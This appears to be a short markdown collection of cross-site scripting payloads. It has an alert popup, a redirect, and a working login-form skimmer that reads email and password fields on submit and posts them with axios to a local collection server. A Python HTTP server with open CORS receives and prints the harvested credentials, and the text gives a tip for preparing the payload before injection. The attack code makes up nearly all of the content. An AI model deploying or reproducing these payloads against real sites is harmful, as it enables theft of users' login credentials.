## Examples

### Print alert
```html
<script>
  alert('You got pwned!')
</script>
```

### Redirect user
```html
<script>
  window.location.replace('https://www.example.com');
</script>
```
### Exfiltrate login data
#### JavaScript code
Use this site to remove whitespace before injecting into site.
https://www.browserling.com/tools/remove-all-whitespace
```html
<script src="https://unpkg.com/axios@1.6.7/dist/axios.min.js"></script>
<script>
  document.getElementById('loginForm').addEventListener('submit', function(event) {
    // Get the text from the input fields
    var email = document.getElementById('email').value;
    var password = document.getElementById('password').value;
    
    // Exfiltrate data with HTTP
    axios.post('http://127.0.0.1:8080', {
        email: email,
        password: password
    })
    .then(function (response) {
        console.log(response);
    })
    .catch(function (error) {
        console.log(error);
    });
  });
</script>
```

#### Python server script
```python
from http.server import BaseHTTPRequestHandler, HTTPServer
import json


class RequestHandler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(204)
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers',
                         'Content-Type, X-Requested-With')  # Added X-Requested-With
        self.end_headers()

    def do_POST(self):
        print("Handling POST request...")
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length)
        data = json.loads(post_data)

        print(f"Received data: {data}")

        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()

        response = {'status': 'success', 'message': 'Data received'}
        self.wfile.write(json.dumps(response).encode('utf-8'))


def run(server_class=HTTPServer, handler_class=RequestHandler, port=8080):
    server_address = ('', port)  # Listen on all interfaces
    httpd = server_class(server_address, handler_class)
    print(f'Starting server on port {port}...')
    httpd.serve_forever()  # Keep the server running


if __name__ == '__main__':
    run()
```
